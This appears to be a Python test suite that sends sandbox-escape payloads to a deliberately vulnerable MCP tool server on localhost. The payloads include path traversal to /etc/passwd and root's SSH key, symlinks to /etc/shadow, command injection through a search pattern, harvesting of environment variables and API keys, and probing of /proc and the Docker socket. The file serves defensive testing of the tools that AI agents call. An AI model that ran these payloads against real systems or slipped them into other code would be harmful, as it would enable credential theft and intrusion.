"""
Comprehensive test suite for sandbox escape techniques.

This module tests all escape techniques documented in ESCAPE_TECHNIQUES.md
against the vulnerable MCP server to verify exploitability.

⚠️ WARNING: For security research and defensive testing only.
"""

import httpx
import json
import re
from typing import Dict, Any, List, Tuple
from datetime import datetime


class EscapeTechniquesTester:
    """Test all documented escape techniques against the MCP server."""

    def __init__(self, mcp_url: str = "http://localhost:8000"):
        self.mcp_url = mcp_url
        self.client = httpx.Client(
            timeout=30.0,
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json, text/event-stream"
            }
        )
        self.results = []

    def call_mcp_tool(self, tool_name: str, arguments: Dict[str, Any]) -> Dict[str, Any]:
        """Call an MCP tool and return the result."""
        payload = {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": tool_name,
                "arguments": arguments
            }
        }

        try:
            response = self.client.post(
                f"{self.mcp_url}/mcp",
                json=payload,
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json, text/event-stream"
                }
            )
            data = response.json()

            # Extract result from MCP response
            if "result" in data:
                return data["result"]
            elif "error" in data:
                return {"error": data["error"]}
            return data
        except Exception as e:
            return {"error": str(e)}

    def extract_output(self, result: Any) -> str:
        """Extract text output from MCP response."""
        if isinstance(result, dict):
            if "content" in result and isinstance(result["content"], list) and len(result["content"]) > 0:
                return result["content"][0].get("text", "")
            elif "error" in result:
                return str(result["error"])
        return str(result)

    def check_success(self, output: str) -> bool:
        """Check if output indicates successful escape (contains /etc/passwd content)."""
        patterns = [
            r"root:.*:0:0:",  # Standard /etc/passwd format
            r"root:x:0:0:",   # Modern format
            r"daemon:.*:",     # Another common user
            r"nobody:.*:",     # Another common user
        ]
        return any(re.search(pattern, output) for pattern in patterns)

    def log_result(self, category: str, technique: str, command: str,
                   success: bool, output: str, notes: str = ""):
        """Log a test result."""
        result = {
            "timestamp": datetime.now().isoformat(),
            "category": category,
            "technique": technique,
            "command": command,
            "success": success,
            "output": output[:500],  # Truncate for logging
            "notes": notes
        }
        self.results.append(result)

        status = "✓ SUCCESS" if success else "✗ FAILED"
        print(f"\n{status} | {category} > {technique}")
        print(f"Command: {command}")
        if success:
            print(f"Output: {output[:200]}...")
        else:
            print(f"Output: {output[:100]}")

    # ========================================================================
    # 1. FILESYSTEM ESCAPE VECTORS
    # ========================================================================

    def test_directory_traversal(self):
        """Test directory traversal techniques."""
        print("\n" + "="*80)
        print("TESTING: Filesystem Escape Vectors - Directory Traversal")
        print("="*80)

        test_cases = [
            ("Basic traversal", "read_file", {"path": "../../../etc/passwd"}),
            ("Absolute path", "read_file", {"path": "/etc/passwd"}),
            ("SSH key access", "read_file", {"path": "../../../../root/.ssh/id_rsa"}),
            ("URL encoded", "read_file", {"path": "..%2F..%2F..%2Fetc%2Fpasswd"}),
            ("Double encoded", "read_file", {"path": "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = self.check_success(output)
            self.log_result("Filesystem Escape", technique, str(args), success, output)

    def test_symlink_attacks(self):
        """Test symlink-based escape techniques."""
        print("\n" + "="*80)
        print("TESTING: Filesystem Escape Vectors - Symlink Attacks")
        print("="*80)

        test_cases = [
            ("Create symlink to passwd", "execute_shell_command",
             {"command": "ln -s /etc/passwd /tmp/myfile && cat /tmp/myfile"}),
            ("Symlink to root", "execute_shell_command",
             {"command": "ln -s / /tmp/root_access && ls /tmp/root_access/etc/"}),
            ("Symlink chain", "execute_shell_command",
             {"command": "ln -s /etc /tmp/etc_link && ln -s /tmp/etc_link/passwd /tmp/target && cat /tmp/target"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = self.check_success(output)
            self.log_result("Symlink Attacks", technique, args["command"], success, output)

    def test_file_descriptor_leakage(self):
        """Test file descriptor leakage techniques."""
        print("\n" + "="*80)
        print("TESTING: Filesystem Escape Vectors - File Descriptor Leakage")
        print("="*80)

        test_cases = [
            ("List process FDs", "execute_shell_command", {"command": "ls -la /proc/self/fd/"}),
            ("List all FDs", "execute_shell_command", {"command": "ls -la /proc/*/fd/ 2>/dev/null"}),
            ("Read FD 3", "execute_shell_command", {"command": "cat /proc/self/fd/3 2>/dev/null"}),
            ("Python list FDs", "execute_python_code",
             {"code": "import os; print(os.listdir('/proc/self/fd'))"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = "fd" in output.lower() or "proc" in output.lower()
            self.log_result("FD Leakage", technique,
                          args.get("command", args.get("code", "")), success, output)

    # ========================================================================
    # 2. MULTI-VECTOR JAILBREAKS (TOOL CHAINING)
    # ========================================================================

    def test_python_shell_escape(self):
        """Test Python → Shell escape techniques."""
        print("\n" + "="*80)
        print("TESTING: Multi-Vector Jailbreaks - Python → Shell Escape")
        print("="*80)

        test_cases = [
            ("Python subprocess", "execute_python_code",
             {"code": "import subprocess; print(subprocess.run(['cat', '/etc/passwd'], capture_output=True).stdout.decode())"}),
            ("Python os.system", "execute_python_code",
             {"code": "import os; os.system('cat /etc/passwd')"}),
            ("Python file read", "execute_python_code",
             {"code": "print(open('/etc/passwd').read())"}),
            ("Python with shell=True", "execute_python_code",
             {"code": "import subprocess; print(subprocess.run('cat /etc/passwd', shell=True, capture_output=True).stdout.decode())"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = self.check_success(output)
            self.log_result("Python → Shell", technique, args["code"], success, output)

    def test_curl_file_access(self):
        """Test curl → File access techniques."""
        print("\n" + "="*80)
        print("TESTING: Multi-Vector Jailbreaks - Curl → File Access")
        print("="*80)

        test_cases = [
            ("Direct file:// access", "curl_request",
             {"url": "file:///etc/passwd"}),
            ("Curl with output", "execute_shell_command",
             {"command": "curl file:///etc/passwd -o /tmp/stolen.txt && cat /tmp/stolen.txt"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = self.check_success(output)
            self.log_result("Curl → File Access", technique,
                          args.get("url", args.get("command", "")), success, output)

    def test_search_command_injection(self):
        """Test search → Command injection techniques."""
        print("\n" + "="*80)
        print("TESTING: Multi-Vector Jailbreaks - Search → Command Injection")
        print("="*80)

        test_cases = [
            ("Inject via pattern", "search_files",
             {"pattern": "root' /etc/passwd || cat /etc/shadow || echo '", "path": "/etc"}),
            ("Inject via semicolon", "search_files",
             {"pattern": "root'; cat /etc/shadow; echo 'pattern", "path": "/etc"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = self.check_success(output) or "shadow" in output.lower()
            self.log_result("Search Injection", technique, str(args), success, output)

    def test_environment_variable_harvesting(self):
        """Test environment variable harvesting."""
        print("\n" + "="*80)
        print("TESTING: Multi-Vector Jailbreaks - Environment Variable Harvesting")
        print("="*80)

        test_cases = [
            ("Get API key", "get_environment_variable", {"name": "GOOGLE_API_KEY"}),
            ("Get PATH", "get_environment_variable", {"name": "PATH"}),
            ("Get HOME", "get_environment_variable", {"name": "HOME"}),
            ("List all env", "execute_shell_command", {"command": "env"}),
            ("Python env", "execute_python_code", {"code": "import os; print(dict(os.environ))"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = len(output) > 10 and "error" not in output.lower()
            self.log_result("Env Harvesting", technique, str(args), success, output)

    # ========================================================================
    # 3. CONTAINER ESCAPE TECHNIQUES
    # ========================================================================

    def test_cgroup_boundary_exploitation(self):
        """Test cgroup boundary exploitation."""
        print("\n" + "="*80)
        print("TESTING: Container Escape - Cgroup Boundary Exploitation")
        print("="*80)

        test_cases = [
            ("Check cgroup", "execute_shell_command", {"command": "cat /proc/self/cgroup"}),
            ("List cgroup fs", "execute_shell_command", {"command": "ls -la /sys/fs/cgroup/"}),
            ("Check memory limit", "execute_shell_command",
             {"command": "cat /sys/fs/cgroup/memory/memory.limit_in_bytes 2>/dev/null"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = "cgroup" in output.lower() or "/sys" in output
            self.log_result("Cgroup Exploitation", technique, args["command"], success, output)

    def test_kernel_vulnerability_check(self):
        """Test kernel vulnerability identification."""
        print("\n" + "="*80)
        print("TESTING: Container Escape - Kernel Vulnerability Check")
        print("="*80)

        test_cases = [
            ("Check kernel version", "execute_shell_command", {"command": "uname -a"}),
            ("Check /proc/version", "execute_shell_command", {"command": "cat /proc/version"}),
            ("List capabilities", "execute_shell_command",
             {"command": "cat /proc/self/status | grep Cap"}),
            ("Find SUID binaries", "execute_shell_command",
             {"command": "find / -perm -4000 2>/dev/null | head -10"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = len(output) > 10 and "error" not in output.lower()
            self.log_result("Kernel Vuln Check", technique, args["command"], success, output)

    def test_syscall_exploitation(self):
        """Test allowed system call exploitation."""
        print("\n" + "="*80)
        print("TESTING: Container Escape - Syscall Exploitation")
        print("="*80)

        test_cases = [
            ("Check seccomp", "execute_shell_command",
             {"command": "cat /proc/self/status | grep Seccomp"}),
            ("List namespaces", "execute_shell_command", {"command": "ls -la /proc/self/ns/"}),
            ("Check host process", "execute_shell_command", {"command": "ls -la /proc/1/"}),
            ("Read host environ", "execute_shell_command",
             {"command": "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -10"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = len(output) > 10 and ("proc" in output.lower() or "ns" in output)
            self.log_result("Syscall Exploitation", technique, args["command"], success, output)

    def test_device_access_escape(self):
        """Test device access for container escape."""
        print("\n" + "="*80)
        print("TESTING: Container Escape - Device Access")
        print("="*80)

        test_cases = [
            ("List devices", "execute_shell_command", {"command": "ls -la /dev/ | head -20"}),
            ("Check Docker socket", "execute_shell_command",
             {"command": "ls -la /var/run/docker.sock 2>/dev/null"}),
            ("List block devices", "execute_shell_command", {"command": "lsblk 2>/dev/null"}),
        ]

        for technique, tool, args in test_cases:
            result = self.call_mcp_tool(tool, args)
            output = self.extract_output(result)
            success = "/dev" in output or "docker" in output.lower()
            self.log_result("Device Access", technique, args["command"], success, output)

    # ========================================================================
    # 4. COMBINED ATTACK CHAINS
    # ========================================================================

    def test_combined_attack_chains(self):
        """Test complex multi-step attack chains."""
        print("\n" + "="*80)
        print("TESTING: Combined Attack Chains")
        print("="*80)

        # Chain 1: Python → Symlink → File Read
        print("\n--- Chain 1: Python → Symlink → File Read ---")
        result1 = self.call_mcp_tool("execute_python_code", {
            "code": "import os; os.symlink('/etc/shadow', '/tmp/shadow_link')"
        })
        result2 = self.call_mcp_tool("read_file", {"path": "/tmp/shadow_link"})
        output = self.extract_output(result2)
        success = "root:" in output or "shadow" in output
        self.log_result("Attack Chain", "Python→Symlink→Read",
                      "/etc/shadow via symlink", success, output)

        # Chain 2: Environment → Command Injection
        print("\n--- Chain 2: Environment → Command Injection ---")
        result = self.call_mcp_tool("execute_shell_command", {
            "command": "echo $HOME && cat $HOME/../etc/passwd 2>/dev/null || cat /etc/passwd"
        })
        output = self.extract_output(result)
        success = self.check_success(output)
        self.log_result("Attack Chain", "Env→CmdInjection",
                      "$HOME expansion + cat", success, output)

        # Chain 3: Search → File Discovery
        print("\n--- Chain 3: Search → File Discovery → Read ---")
        result = self.call_mcp_tool("search_files", {
            "pattern": "root",
            "path": "/etc"
        })
        output = self.extract_output(result)
        success = "passwd" in output.lower() or "shadow" in output.lower()
        self.log_result("Attack Chain", "Search→Discovery",
                      "Find sensitive files", success, output)

    # ========================================================================
    # REPORTING
    # ========================================================================

    def generate_report(self) -> str:
        """Generate a comprehensive test report."""
        total_tests = len(self.results)
        successful_escapes = sum(1 for r in self.results if r["success"])

        report = f"""
{'='*80}
SANDBOX ESCAPE TECHNIQUES TEST REPORT
{'='*80}
Timestamp: {datetime.now().isoformat()}
MCP Server: {self.mcp_url}

SUMMARY:
--------
Total Tests: {total_tests}
Successful Escapes: {successful_escapes}
Failed Attempts: {total_tests - successful_escapes}
Success Rate: {(successful_escapes / total_tests * 100):.1f}%

RESULTS BY CATEGORY:
"""

        # Group by category
        by_category = {}
        for result in self.results:
            category = result["category"]
            if category not in by_category:
                by_category[category] = {"total": 0, "success": 0}
            by_category[category]["total"] += 1
            if result["success"]:
                by_category[category]["success"] += 1

        for category, stats in sorted(by_category.items()):
            rate = (stats["success"] / stats["total"] * 100) if stats["total"] > 0 else 0
            report += f"\n{category}:\n"
            report += f"  Success: {stats['success']}/{stats['total']} ({rate:.1f}%)\n"

        report += f"\n{'='*80}\n"
        report += "DETAILED RESULTS:\n"
        report += f"{'='*80}\n\n"

        for result in self.results:
            status = "✓ SUCCESS" if result["success"] else "✗ FAILED"
            report += f"{status} | {result['category']} > {result['technique']}\n"
            report += f"  Command: {result['command']}\n"
            report += f"  Output: {result['output'][:150]}...\n"
            if result['notes']:
                report += f"  Notes: {result['notes']}\n"
            report += "\n"

        return report

    def save_report(self, filename: str = None):
        """Save the test report to a file."""
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"escape_techniques_test_{timestamp}.txt"

        report = self.generate_report()
        with open(filename, 'w') as f:
            f.write(report)

        print(f"\n✓ Report saved to: {filename}")
        return filename


def run_all_tests():
    """Run all escape technique tests."""
    print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                  SANDBOX ESCAPE TECHNIQUES TEST SUITE                        ║
║                   For Security Research and Testing Only                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")

    tester = EscapeTechniquesTester()

    # Run all test suites
    tester.test_directory_traversal()
    tester.test_symlink_attacks()
    tester.test_file_descriptor_leakage()
    tester.test_python_shell_escape()
    tester.test_curl_file_access()
    tester.test_search_command_injection()
    tester.test_environment_variable_harvesting()
    tester.test_cgroup_boundary_exploitation()
    tester.test_kernel_vulnerability_check()
    tester.test_syscall_exploitation()
    tester.test_device_access_escape()
    tester.test_combined_attack_chains()

    # Generate and display report
    print("\n" + "="*80)
    print(tester.generate_report())

    # Save report
    report_file = tester.save_report()

    return tester.results


if __name__ == "__main__":
    results = run_all_tests()
